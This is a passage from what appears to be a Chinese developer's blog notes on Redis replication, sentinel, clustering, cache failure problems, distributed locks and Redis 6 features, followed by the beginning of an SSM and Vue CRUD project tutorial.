全量复制：而slave服务在接收到数据库文件数据后，将其存盘并加载到内存中。\n\n- 3、之后每次主服务器进行写操作之后，和从服务器进行数据同步（增量复制）（即第一次需要从服务器请求，之后每次主服务器主动同步）\n\n  - 增量复制：Master继续将新的所有收集到的修改命令依次传给slave,完成同步\n\n  - 从机挂掉，重新连接主机，自动执行一次全量复制\n\n## 2.模拟一主二仆\n\n![](https://img.jwt1399.top/img/202209011629975.png)\n\n> 模拟三台 redis 服务器（6379、6380、6381），主机（6379）从机（6380、6381）\n>\n> 我的 redis 配置文件路径： /opt/homebrew/etc/redis.conf\n\n- 1.新建文件夹 myredis\n\n```bash\n$ pwd\n/Users/jianjian\n$ mkdir myredis\n$ cd  /myredis\n$ pwd\n/Users/jianjian/myredis\n```\n\n- 2.复制 redis.conf 配置文件到该文件夹\n\n```bash\n$ cp /opt/homebrew/etc/redis.conf  ~/myredis/redis.conf\n```\n\n- 3.配置一主两从，创建三个配置文件\n\n```bash\n$ vi redis6379.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6379.pid\nport 6379\ndbfilename dump6379.rdb\n\n$ vi redis6380.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6380.pid\nport 6380\ndbfilename dump6380.rdb\n\n$ vi redis6381.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6381.pid\nport 6381\ndbfilename dump6381.rdb\n```\n\n- 4.启动三台redis服务器\n\n```bash\n$ redis-server redis6379.conf\n$ redis-server redis6380.conf\n$ redis-server redis6381.conf\n```\n\n- 5.查看系统进程，看看三台服务器是否启动\n\n```bash\n$ ps -ef | grep redis\n\n501 85018 80912   0  3:54PM ttys000    0:00.60 redis-server 127.0.0.1:6380\n501 86115 85019   0  3:56PM ttys001    0:00.49 redis-server 127.0.0.1:6379\n501 86631 86116   0  3:57PM ttys002    0:00.35 redis-server 127.0.0.1:6381\n```\n\n- 6.查看三台主机运行情况\n\n```bash\n$ redis-cli -p 6379\n127.0.0.1:6379> info replication\n\n# Replication\nrole:master\nconnected_slaves:0\n......\n```\n\n```bash\n$ redis-cli -p 6380\n127.0.0.1:6380> info replication\n\n# Replication\nrole:master\nconnected_slaves:0\n......\n```\n\n```bash\n$ redis-cli -p 6381\n127.0.0.1:6381> info replication\n\n# Replication\nrole:master\nconnected_slaves:0\n......\n```\n\n- 7.配置从机\n  - `slaveof <ip><port>` 成为某个实例的从服务器\n\n```bash\n# 在6380和6381上执行: slaveof 127.0.0.1 6379\n\n#变为从机\n$ redis-cli -p 6380\n127.0.0.1:6380>slaveof 127.0.0.1 6379\n127.0.0.1:6380> info replication\n# Replication\nrole:slave\nmaster_host:127.0.0.1\nmaster_port:6379\n......\n\n#变为从机\n$ redis-cli -p 6381\n127.0.0.1:6381>slaveof 127.0.0.1 6379\n127.0.0.1:6381> info replication\n# Replication\nrole:slave\nmaster_host:127.0.0.1\nmaster_port:6379\n```\n\n- 8、在主机上写，在从机上可以读取数据\n\n```bash\n# 主机写入数据\n$ redis-cli -p 6379\n127.0.0.1:6379> set k1 v1\n127.0.0.1:6379> keys *\n1) \"k1\"\n```\n\n```bash\n# 从机可以读取数据\n$ redis-cli -p 6380\n127.0.0.1:6380> keys *\n1) \"k1\"\n```\n\n```bash\n# 从机可以读取数据\n$ redis-cli -p 6381\n127.0.0.1:6381> get k1\n1) \"v1\"\n```\n\n**注**：如果主机挂掉，重启就行，一切如初。从机重启需重设：slaveof 127.0.0.1 6379 \n\n可以将配置增加到文件中。永久生效。\n\n**Q&A**\n\n**slave1、slave2是从头开始复制还是从切入点开始复制?比如从k4进来，那之前的k1,k2,k3是否也可以复制？**\n\n从头开始复制；可以\n\n**从机是否可以写？set可否？** \n\n不可以\n\n**主机shutdown后情况如何？从机是上位还是原地待命？**\n\n主机挂掉，从机原地待命\n\n**主机又回来了后，主机新增记录，从机还能否顺利复制？** \n\n可以\n\n**其中一台从机down后情况如何？依照原有它能跟上大部队吗？**\n\n从机挂掉重启后需要重设：slaveof 127.0.0.1 6379 \n\n## 3.薪火相传\n\n上一个 Slave 可以是下一个 slave 的Master，slave 同样可以接收其他 slave 的连接和同步请求，那么该 slave 作为了链条中下一个的 master，可以有效减轻 master 的写压力，去中心化降低风险。\n\n![](https://img.jwt1399.top/img/202209011637640.png)\n\n```bash\n$ redis-cli -p 6380\n127.0.0.1:6380>slaveof 127.0.0.1 6379\n\n$ redis-cli -p 6381\n127.0.0.1:6381>slaveof 127.0.0.1 6380\n```\n\n## 4.反客为主\n\n> 即 主机挂掉之后，备机上位成为主机，保证服务正常进行\n\n当一个 master 宕机后，后面的 slave 可以立刻升为 master，其后面的 slave 不用做任何修改。用 `slaveof no one`  将从机变为主机。\n\n```bash\n# master 宕机\n$ redis-cli -p 6379\n127.0.0.1:6379> shutdown\n```\n\n```bash\n# slave1升为master\n$ redis-cli -p 6380\n127.0.0.1:6380> slave no one\n127.0.0.1:6380> set k2 v2\n```\n\n```bash\n$ redis-cli -p 6381\n127.0.0.1:6381> get k2\n\"v2\"\n```\n\n## 5.哨兵模式\n\n**反客为主的自动版**，能够后台监控主机是否故障，如果故障了根据投票数自动将从机转换为主机\n\n![](https://img.jwt1399.top/img/202209011737377.png)\n\n**配置哨兵**\n\n- 新建 sentinel.conf 文件，写入如下内容\n\n```bash\n$ vi sentinel.conf\n\nsentinel monitor mymaster 127.0.0.1 6379 1\n```\n\n其中 mymaster 为监控对象起的服务器名称， 1 为至少有多少个哨兵同意迁移的数量。 \n\n**启动哨兵**\n\n```bash\n$ redis-sentinel sentinel.conf \n```\n\n![](https://img.jwt1399.top/img/202209011811442.png)\n\n**当主机挂掉，从机选举中产生新的主机**\n\n```bash\n$ 127.0.0.1:6379> shutdown\n```\n\n![](https://img.jwt1399.top/img/202209011812295.png)\n\n这里显示6380变成了主机，原主机6379重启后会变为从机。\n\n**哪个从机会被选举为主机呢？根据优先级别：replica-priority**\n\n![](https://img.jwt1399.top/img/202209011806743.png)\n\n- 优先级在redis.conf中默认：replica-priority 100 值，越小优先级越高\n\n- 偏移量是指获得原主机数据最全的\n\n- 每个redis实例启动后都会随机生成一个40位的runid\n\n#  九、集群\n\nRedis 集群实现了对Redis的水平扩容，即启动N个redis节点，将整个数据库分布存储在这N个节点中，每个节点存储总数据的1/N。Redis 集群通过分区（partition）来提供一定程度的可用性（availability）： 即使集群中有一部分节点失效或者无法进行通讯， 集群也可以继续处理命令请求。\n\n**Redis** **集群提供了以下好处**\n\n- 实现扩容\n\n- 分摊压力\n\n- 无中心配置相对简单\n\n**Redis** **集群的不足**\n\n- 多键操作是不被支持的 \n\n- 多键的Redis事务是不被支持的。lua脚本不被支持\n\n- 由于集群方案出现较晚，很多公司已经采用了其他的集群方案，而代理或者客户端分片的方案想要迁移至redis cluster，需要整体迁移而不是逐步过渡，复杂度较大。\n\n## 1.模拟集群\n\n> 模拟6台 redis 服务器，6379、6380、6381、6389、6390、6391\n>\n> 主机（6379、6380、6381）；从机（6389、6390、6391），将他们加入一个集群中\n\n- 配置 redis6379.conf 文件，拷贝 5 个 redis6379.conf 文件\n\n```bash\n$ vi redis6379.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6379.pid\nport 6379\ndbfilename dump6379.rdb\n## cluster配置修改\ndir \"/Users/jianjian/myredis/redis_cluster\"\nlogfile \"/Users/jianjian/myredis/redis_cluster/redis_err_6379.log\"\n# 打开集群模式\ncluster-enabled yes\n# 设定节点配置文件名\ncluster-config-file nodes-6379.conf\n# 设定节点失联时间，超过该时间（毫秒），集群自动进行主从切换\ncluster-node-timeout 15000\n```\n```bash\n$ cp redis6379.conf redis6380.conf\n$ cp redis6379.conf redis6381.conf\n$ cp redis6379.conf redis6389.conf\n$ cp redis6379.conf redis6390.conf\n$ cp redis6379.conf redis6391.conf\n```\n\n- 使用查找替换修改拷贝的5个文件\n\n```bash\n#将redis6380.conf中的6379替换为6380\n$ vi redis6380.conf\n\n:%s/6379/6380  \n```\n\n- 启动 6个 redis 服务\n\n![](https://img.jwt1399.top/img/202210242303751.png)\n\n- 将六个节点合成一个集群\n\n合成之前，请确保所有redis实例启动后，nodes-xxxx.conf文件都生成正常。\n\n```bash\n$ redis-cli --cluster create --cluster-replicas 1 192.168.11.101:6379 192.168.11.101:6380 192.168.11.101:6381 192.168.11.101:6389 192.168.11.101:6390 192.168.11.101:6391\n```\n\n此处不要用127.0.0.1， 请用真实IP地址；`--cluster-replicas 1` 表示采用最简单的方式配置集群，一台主机，一台从机，正好三组。\n\n* 采用集群策略连接，设置数据会自动切换到相应的写主机\n\n```bash\n$ redis-cli -c -p 6379\n```\n\n- 查看集群信息\n\n```bash\n127.0.0.1:6379> cluster nodes\n```\n\n## 2.slots\n\n**什么是slots**\n\n一个 Redis 集群包含 16384 个插槽（hash slot）， 数据库中的每个键都属于这 16384 个插槽的其中一个， 集群使用公式 CRC16(key) % 16384 来计算键 key 属于哪个槽， 其中 CRC16(key) 语句用于计算键 key 的 CRC16 校验和 。\n\n集群中的每个节点负责处理一部分插槽。 举个例子， 如果一个集群可以有主节点， 其中：\n\n节点 A 负责处理 0 号至 5460 号插槽。\n\n节点 B 负责处理 5461 号至 10922 号插槽。\n\n节点 C 负责处理 10923 号至 16383 号插槽。\n\n**在集群中录入值**\n\n在redis-cli每次录入、查询键值，redis都会计算出该key应该送往的插槽 slot ，如果不是该客\n\n户端对应服务器的插槽，redis会报错，并告知应前往的redis实例地址和端口。\n\nredis-cli客户端提供了 –c 参数实现自动重定向。如 redis-cli -c –p 6379 登入后，再录入、查询键值对可以自动重定向。\n\n- 不在一个slot下的键值，是不能使用mget,mset等多键操作。\n\n![](https://img.jwt1399.top/img/202209022233587.png)\n\n- 可以通过{}来定义组的概念，从而使key中{}内相同内容的键值对放到一个slot中去。\n\n![](https://img.jwt1399.top/img/202209022233682.png)\n\n- 查询集群中的值\n\n`CLUSTER GETKEYSINSLOT <slot><count>` 返回 count 个 slot 槽中的键\n\n![](https://img.jwt1399.top/img/202209022234749.png)\n\n## 3.故障恢复\n\n如果主节点下线？从节点能否自动升为主节点？注意：15秒超时\n\n...                               \n\n主节点恢复后，主从关系会如何？\n\n主节点回来变成从机。\n\n如果所有某一段插槽的主从节点都宕掉，redis服务是否还能继续?\n\n- 如果某一段插槽的主从都挂掉，而cluster-require-full-coverage 为yes ，那么 ，整个集群都挂掉\n\n- 如果某一段插槽的主从都挂掉，而cluster-require-full-coverage 为no ，那么，该插槽数据全都不能使用，也无法存储。\n\n## 4.集群的 Jedis 开发\n\n即使连接的不是主机，集群会自动切换主机存储。主机写，从机读。\n\n无中心化主从集群。无论从哪台主机写的数据，其他主机上都能读到数据。\n\n```java\npublic class JedisClusterTest {\n  public static void main(String[] args) { \n     Set<HostAndPort>set =new HashSet<HostAndPort>();\n     set.add(new HostAndPort(\"192.168.31.211\",6379));\n     JedisCluster jedisCluster=new JedisCluster(set);\n     jedisCluster.set(\"k1\", \"v1\");\n     System.out.println(jedisCluster.get(\"k1\"));\n  }\n}\n```\n\n# 十、应用问题\n\n## 1.缓存穿透\n\n> 问题描述\n\nkey 对应的数据在数据源并不存在，每次针对此 key 的请求从缓存获取不到，请求都会压到数据源，从而可能压垮数据源。比如用一个不存在的用户 id 获取用户信息，不论缓存还是数据库都没有，若黑客利用此漏洞进行攻击可能压垮数据库。\n\n- 1、应用服务器压力变大了\n- 2、redis 命中率降低\n- 3、 一直查询数据库\n\n![](https://img.jwt1399.top/img/202209031811627.png)\n\n一个一定不存在缓存及查询不到的数据，由于缓存是不命中时被动写的，并且出于容错考虑，如果从存储层查不到数据则不写入缓存，这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存的意义。\n\n> 解决方案\n\n- 1、**对空值缓存：**如果一个查询返回的数据为空（不管是数据是否不存在），我们仍然把这个空结果（null）进行缓存，设置空结果的过期时间会很短，最长不超过五分钟\n\n- 2、**设置可访问的名单（白名单）：**使用 bitmaps 类型定义一个可以访问的名单，名单 id作为 bitmaps 的偏移量，每次访问和 bitmap 里面的 id 进行比较，如果访问 id 不在bitmaps 里面，进行拦截，不允许访问。\n\n- 3、**采用布隆过滤器**：布隆过滤器可以用于检索一个元素是否在一个集合中。它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。将所有可能存在的数据哈希到一个足够大的布隆过滤器中，一个一定不存在的数据会被这个布隆过滤器拦截掉，从而避免了对底层存储系统的查询压力。\n\n- 4、**进行实时监控：**当发现Redis的命中率开始急速降低，需要排查访问对象和访问的数据，和运维人员配合，可以设置黑名单限制服务\n\n## 2.缓存击穿\n\n> 问题描述\n\nkey 对应的数据存在，但在 redis 中过期，此时若有大量并发请求过来，这些请求发现缓存过期一般都会从后端 DB 加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端 DB 压垮。\n\n- 1、数据库访问压力瞬时增加\n- 2、redis 某个 key 过期了，大量访问使用这个key\n- 3、redis 正常运行\n\n![](https://img.jwt1399.top/img/202209031817897.png)                               \n\nkey可能会在某些时间点被超高并发地访问，是一种非常“热点”的数据。这个时候，需要考虑一个问题：缓存被“击穿”的问题。\n\n>  解决方案\n\n- 1、**预先设置热门数据**：在redis高峰访问之前，把一些热门数据提前存入到redis里面，加大这些热门数据key的时长\n\n- 2、**实时调整**：现场监控哪些数据热门，实时调整key的过期时长\n\n- 3、**使用锁**：\n\n  - 1.就是在缓存失效的时候（判断拿出来的值为空），不是立即去load db。\n  - 2.先使用缓存工具的某些带成功操作返回值的操作（比如Redis的SETNX）去set一个mutex key\n  - 3.当操作返回成功时，再进行load db的操作，并回设缓存，最后删除mutex key；\n  - 4.当操作返回失败，证明有线程在load db，当前线程睡眠一段时间再重试整个get缓存的方法。 \n\n  ![](https://img.jwt1399.top/img/202209031826143.png)\n\n## 3.缓存雪崩\n\n> 问题描述\n\nkey 对应的数据存在，但在 redis 中过期，此时若有大量并发请求过来，这些请求发现缓存过期一般都会从后端 DB 加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端DB压垮。缓存雪崩与缓存击穿的区别在于这里针对很多 key 缓存，前者则是某一个 key。\n\n- 1、数据库压力变大服务器崩溃\n- 2、在极少时间段，查询大量 key 的集中过期\n\n![](https://img.jwt1399.top/img/202209031831902.png)\n\n\n\n缓存失效时的雪崩效应对底层系统的冲击非常可怕！\n\n> 解决方案\n\n- 1、 **构建多级缓存架构：**nginx缓存 + redis缓存 +其他缓存（ehcache等）\n\n- 2、**使用锁或队列：**用加锁或者队列的方式保证来保证不会有大量的线程对数据库一次性进行读写，从而避免失效时大量的并发请求落到底层存储系统上。不适用高并发情况\n\n- 3、  **设置过期标志更新缓存：**记录缓存数据是否过期（设置提前量），如果过期会触发通知另外的线程在后台去更新实际key的缓存。\n\n- 4、**将缓存失效时间分散开：**比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。\n\n## 4.分布式锁\n\n> 问题描述\n\n随着业务发展的需要，原单体单机部署的系统被演化成分布式集群系统后，由于分布式系统多线程、多进程并且分布在不同机器上，这将使原单机部署情况下的并发控制锁策略失效，单纯的Java API并不能提供分布式锁的能力。为了解决这个问题就需要一种跨JVM的互斥机制来控制共享资源的访问，这就是分布式锁要解决的问题！\n\n> 解决方案\n\n分布式锁主流的实现方案：\n\n- 1.基于数据库实现分布式锁\n\n- 2.基于缓存（Redis等）\n- 3.基于Zookeeper\n\n每一种分布式锁解决方案都有各自的优缺点：\n\n- 性能：redis最高\n\n- 可靠性：zookeeper最高\n\n这里，我们就基于redis实现分布式锁。\n\n```bash\n$ 127.0.0.1:6379>  set key value EX second\n$ 127.0.0.1:6379>  set sku:1:info “OK” NX PX 10000\n```\n\n- EX second ：设置键的过期时间为 second 秒。 SET key value EX second 效果等同于 SETEX key second value 。\n- PX millisecond ：设置键的过期时间为 millisecond 毫秒。 SET key value PX millisecond 效果等同于 PSETEX key millisecond value 。\n- NX ：只在键不存在时，才对键进行设置操作。 SET key value NX 效果等同于 SETNX key value 。\n- XX ：只在键已经存在时，才对键进行设置操作。\n\n![](https://img.jwt1399.top/img/202209042203987.png)\n\n```java\n@GetMapping(\"testLock\")\npublic void testLock(){\n    //1获取锁，setne\n    Boolean lock = redisTemplate.opsForValue().setIfAbsent(\"lock\", \"111\");\n    //2获取锁成功、查询num的值\n    if(lock){\n        Object value = redisTemplate.opsForValue().get(\"num\");\n        //2.1判断num为空return\n        if(StringUtils.isEmpty(value)){\n            return;\n        }\n        //2.2有值就转成成int\n        int num = Integer.parseInt(value+\"\");\n        //2.3把redis的num加1\n        redisTemplate.opsForValue().set(\"num\", ++num);\n        //2.4释放锁，del\n        redisTemplate.delete(\"lock\");\n\n    }else{\n        //3获取锁失败、每隔0.1秒再获取\n        try {\n            Thread.sleep(100);\n            testLock();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n> **优化之设置锁的过期时间**\n\n问题：setnx刚好获取到锁，业务逻辑出现异常，导致锁无法释放\n\n解决：设置过期时间，自动释放锁。\n\n设置过期时间有两种方式：\n\n- 1.首先想到通过expire设置过期时间（缺乏原子性：如果在setnx和expire之间出现异常，锁也无法释放）\n- 2.在set时指定过期时间（推荐）\n\n![](https://img.jwt1399.top/img/202209042204776.png)\n\n![](https://img.jwt1399.top/img/202209042205533.png)\n\n> **优化之UUID防误删**\n\n场景：如果业务逻辑的执行时间是7s。执行流程如下\n\n1. index1业务逻辑没执行完，3秒后锁被自动释放。\n\n2. index2获取到锁，执行业务逻辑，3秒后锁被自动释放。\n\n3. index3获取到锁，执行业务逻辑\n\n4. index1业务逻辑执行完成，开始调用del释放锁，这时释放的是index3的锁，导致index3的业务只执行1s就被别人释放。最终等于没锁的情况。\n\n解决：setnx获取锁时，设置一个指定的唯一值（例如：uuid）；释放前获取这个值，判断是否自己的锁\n\n![](https://img.jwt1399.top/img/202209042210208.png)\n\n![](https://img.jwt1399.top/img/202209042210135.png)\n\n> **优化之LUA脚本保证删除的原子性**\n\n问题：删除操作缺乏原子性。\n\n场景：\n\n1. index1执行删除时，查询到的lock值确实和uuid相等\n\n```\nuuid=v1\nset(lock,uuid)；\n```\n\n![](https://img.jwt1399.top/img/202209042212222.png)                         \n\n2. index1执行删除前，lock刚好过期时间已到，被redis自动释放\n\n在redis中没有了lock，没有了锁。\n\n![](https://img.jwt1399.top/img/202209042212030.png) \n\n3. index2获取了lock\n\nindex2线程获取到了cpu的资源，开始执行方法\n\n```\nuuid=v2\nset(lock,uuid)；\n```\n\n4. index1执行删除，此时会把index2的lock删除\n\nindex1 因为已经在方法中了，所以不需要重新上锁。index1有执行的权限。index1已经比较完成了，这个时候，开始执行\n\n![](https://img.jwt1399.top/img/202209042212365.png)\n\n删除的index2的锁！\n\n```java\n@GetMapping(\"testLockLua\")\npublic void testLockLua() {\n    //1 声明一个uuid ,将做为一个value 放入我们的key所对应的值中\n    String uuid = UUID.randomUUID().toString();\n    //2 定义一个锁：lua 脚本可以使用同一把锁，来实现删除！\n    String skuId = \"25\"; // 访问skuId 为25号的商品 100008348542\n    String locKey = \"lock:\" + skuId; // 锁住的是每个商品的数据\n\n    // 3 获取锁\n    Boolean lock = redisTemplate.opsForValue().setIfAbsent(locKey, uuid, 3, TimeUnit.SECONDS);\n\n    // 第一种： lock 与过期时间中间不写任何的代码。\n    // redisTemplate.expire(\"lock\",10, TimeUnit.SECONDS);//设置过期时间\n    // 如果true\n    if (lock) {\n        // 执行的业务逻辑开始\n        // 获取缓存中的num 数据\n        Object value = redisTemplate.opsForValue().get(\"num\");\n        // 如果是空直接返回\n        if (StringUtils.isEmpty(value)) {\n            return;\n        }\n        // 不是空 如果说在这出现了异常！ 那么delete 就删除失败！ 也就是说锁永远存在！\n        int num = Integer.parseInt(value + \"\");\n        // 使num 每次+1 放入缓存\n        redisTemplate.opsForValue().set(\"num\", String.valueOf(++num));\n        /*使用lua脚本来锁*/\n        // 定义lua 脚本\n        String script = \"if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end\";\n        // 使用redis执行lua执行\n        DefaultRedisScript<Long> redisScript = new DefaultRedisScript<>();\n        redisScript.setScriptText(script);\n        // 设置一下返回值类型 为Long\n        // 因为删除判断的时候，返回的0,给其封装为数据类型。如果不封装那么默认返回String 类型，\n        // 那么返回字符串与0 会有发生错误。\n        redisScript.setResultType(Long.class);\n        // 第一个要是script 脚本 ，第二个需要判断的key，第三个就是key所对应的值。\n        redisTemplate.execute(redisScript, Arrays.asList(locKey), uuid);\n    } else {\n        // 其他线程等待\n        try {\n            // 睡眠\n            Thread.sleep(1000);\n            // 睡醒了之后，调用方法。\n            testLockLua();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n**总结**\n\n为了确保分布式锁可用，我们至少要确保锁的实现同时满足以下四个条件：\n\n- **互斥性。**在任意时刻，只有一个客户端能持有锁。\n- **不会发生死锁。**即使有一个客户端在持有锁的期间崩溃而没有主动解锁，也能保证后续其他客户端能加锁。\n- **解铃还须系铃人。**加锁和解锁必须是同一个客户端，客户端自己不能把别人加的锁给解了。\n- **加锁和解锁必须具有原子性。**\n\n同一时间只有一个人有锁，而且开锁解锁都是同一个人，不会死锁\n\n# 十一、6.0新功能\n\n## 1.ACL\n\n### 简介\n\nRedis ACL是Access Control List（访问控制列表）的缩写，该功能允许根据可以执行的命令和可以访问的键来限制某些连接。\n\n在Redis 5版本之前，Redis 安全规则只有密码控制 还有通过 rename 来调整高危命令比如 flushdb ， KEYS* ， shutdown 等。Redis 6 则提供ACL的功能对用户进行更细粒度的权限控制 ：\n\n（1）接入权限：用户名和密码 \n\n（2）可以执行的命令 \n\n（3）可以操作的 KEY\n\n### 命令\n\n-  `acl list` 展现用户权限列表\n\n![](https://img.jwt1399.top/img/202209042132049.png)\n\n- `acl cat` 查看添加权限指令类别，加参数类型名可以查看类型下具体命令\n\n| ![](https://img.jwt1399.top/img/202209042135546.png) | ![](https://img.jwt1399.top/img/202209042135820.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n- `acl whoami` 查看当前用户\n\n![](https://img.jwt1399.top/img/202209042136959.png)\n\n- `acl setuser` 创建和编辑用户ACL\n\n下面是有效ACL规则的列表。某些规则只是用于激活或删除标志，或对用户ACL执行给定更改的单个单词。其他规则是字符前缀，它们与命令或类别名称、键模式等连接在一起。\n\n![](https://img.jwt1399.top/img/202209042146682.png)\n\n- 创建新用户默认权限\n\n```bash\nacl setuser 用户名\n```\n\n![](https://img.jwt1399.top/img/202209042149085.png)\n\n- 设置有用户名、密码、ACL权限、并启用的用户\n\n```bash\nacl setuser user2 on >password ~cached:* +get\n```\n\n![](https://img.jwt1399.top/img/202209042150739.png)\n\n- 切换用户，验证权限\n\n```bash\nauth user2 password\n```\n\n![](https://img.jwt1399.top/img/202209042150436.png)\n\n## 2.IO多线程\n\nRedis 6终于支持多线程了，告别单线程了吗？\n\nIO 多线程其实指**客户端交互部分**的**网络IO**交互处理模块**多线程**，而非**执行命令多线程**。Redis6执行命令依然是单线程。\n\n **原理架构**\n\nRedis 6 加入多线程，但跟 Memcached 这种从 IO处理到数据访问多线程的实现模式有些差异。Redis 的多线程部分只是用来处理网络数据的读写和协议解析，执行命令仍然是单线程。之所以这么设计是不想因为多线程而变得复杂，需要去控制 key、lua、事务，LPUSH/LPOP 等等的并发问题。整体的设计大体如下:\n\n![](https://img.jwt1399.top/img/202209042159608.png)\n\n另外，多线程IO默认也是不开启的，需要在配置文件中配置\n\n```\nio-threads-do-reads yes \n\nio-threads 4\n```\n\n## 3.Cluster\n\n之前老版 Redis 想要搭集群需要单独安装 ruby 环境，Redis 5 将 redis-trib.rb 的功能集成到 redis-cli 。另外官方 redis-benchmark 工具开始支持 cluster 模式了，通过多线程的方式对多个分片进行压测。\n\n## 4.其它功能\n\n1、RESP3新的 Redis 通信协议：优化服务端与客户端之间通信\n\n2、Client side caching客户端缓存：基于 RESP3 协议实现的客户端缓存功能。为了进一步提升缓存的性能，将客户端经常访问的数据cache到客户端。减少TCP网络交互。\n\n3、Proxy集群代理模式：Proxy 功能，让 Cluster 拥有像单实例一样的接入方式，降低大家使用cluster的门槛。不过需要注意的是代理不改变 Cluster 的功能限制，不支持的命令还是不会支持，比如跨 slot 的多Key操作。\n\n4、Modules API：Redis 6中模块API开发进展非常大，因为Redis Labs为了开发复杂的功能，从一开始就用上Redis模块。Redis可以变成一个框架，利用Modules来构建不同系统，而不需要从头开始写然后还要BSD许可。Redis一开始就是一个向编写各种系统开放的平台。\n\n\n\n# 参考\n\n- [ Redis框架从入门到学精（全）](https://blog.csdn.net/weixin_47872288/article/details/118410080)\n- [Redis基础篇 (oz6.cn)](https://www.oz6.cn/articles/58)\n\n\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["NoSQL"],"categories":["SQL"]},{"title":"SSM整合","url":"/posts/42096.html","content":"\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《SSM整合》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计7天更新完\n- [x] 🎯开始时间：06-03\n- [x] 🎉结束时间：06-17\n- [x] 🍀总结：中间花了点时间学Vue，磨磨蹭蹭的终于完成了，配置太多了，一直在改bug的路上，前端比后端难！\n\n## 一、项目概览\n\n> 本文将实现一个基于 SSM-VUE 前后端分离的 CRUD 的小 Demo 来学习SSM整合，项目命名为SSM-VUE-CRUD\n\n项目地址：https://github.com/jwt1399/SSM-VUE-CRUD\n\n### 相关技术\n\n####  前端\n\n- 开发框架：Vue3、Axios、Element Plus\n- 脚手架：@Vue/cli\n\n- 依赖管理: npm\n\n- 开发工具：VSCode 、Chrome\n\n#### 后端\n\n- 开发框架：Spring、SpringMVC、Mybatis\n\n- 数据库：MySQL\n\n- 分页： pagehelper\n- 逆向工程： Mybatis Generator\n\n- 依赖管理： Maven\n- 开发工具：IDEA 2022.1、Navicat 16\n\n### 项目展示\n\n#### 1.员工列表\n\n![](https://img.jwt1399.top/img/202206181715532.png)\n\n#### 2.添加员工\n\n![](https://img.jwt1399.top/img/202206181715024.png)\n\n#### 3.修改员工\n\n![](https://img.jwt1399.top/img/202206181716115.png)\n\n#### 4.删除员工\n\n![](https://img.jwt1399.top/img/202206181716034.png)\n\n#### 5.批量删除员工\n\n![](https://img.jwt1399.top/img/202206181716759.png)\n\n### 项目部署\n\n#### 后端部署\n\n##### 1.克隆本项目到本地\n\n```bash\ngit clone https://github.com/jwt1399/SSM-VUE-CRUD.git\n```\n\n##### 2.创建数据库导入数据\n\n先创建一个名为 ssm_crud 的数据库，然后再导入表数据 `ssm_crud.sql`\n\n##### 3.安装依赖\n\n使用 IDEA 打开项目下的 ssm-crud-back ，等待 Maven 将 pom.xml 中的依赖下载完\n\n##### 4.修改数据库配置\n\n找到 src/main/resouces/db.properties 修改成你自己的数据库配置\n\n```properties\njdbc.driver=com.mysql.cj.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud?useUnicode=true&characterEncoding=utf8\njdbc.username=root\njdbc.password=root\n```\n\n##### 5.添加TomCat\n\n- 点击 Add Configuration(添加配置) 进行配置， 点击 + 号，找到 Tomcat Service -> Local(本地)\n- 再点击 Tomcat 配置界面的 Deployment(部署)，再点击右下角的 fix ，选择 ssm-crud-back:war exploded，再将 Application context(应用程序上下文) 改为 /ssm_crud_back\n- 再将服务器 URL 改为\"`http://localhost:8080/ssm_crud_back/`\"，修改后应用即可\n\n##### 6.启动项目\n\n配置完 TomCat 后运行项目，浏览器会打开\"`http://localhost:8080/ssm_crud_back/`\"，显示“SSM-VUE-CRUD后端部署成功！！！”的文字，表示后端运行成功\n\n#### 前端部署\n\n##### 1.安装依赖\n\n使用 VScode 打开项目下的 ssm-crud-front，打开终端执行 `npm i` 下载依赖\n\n##### 2.启动项目\n\n终端再执行 `npm run serve` 运行项目，编译完成后会浏览器会自动打开 \"`http://0.0.0.0:8084/#/`\"（可在vue.config.修改），当看到项目展示中的页面就说明部署成功啦。\n\n## 二、后端实现\n\n### 1.环境搭建\n\n#### a.创建Maven项目\n\n参考：[IDEA创建maven web工程](https://www.cnblogs.com/l-y-h/p/11454933.html)\n\n#### b.引入项目依赖jar包\n\n需要配置Spring，SpringMVC，mybatis，数据库连接池，数据库驱动包，以及其他的jar包，比如junit等。\n\n```xml\n<dependencies>\n  <!-- Spring WebMVC -->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-webmvc</artifactId>\n      <version>5.3.20</version>\n  </dependency>\n\n  <!-- Spring JDBC -->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-jdbc</artifactId>\n      <version>5.3.20</version>\n  </dependency>\n\n  <!-- Spring Aspects -->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-aspects</artifactId>\n      <version>5.3.20</version>\n  </dependency>\n  \n  <!-- Spring test 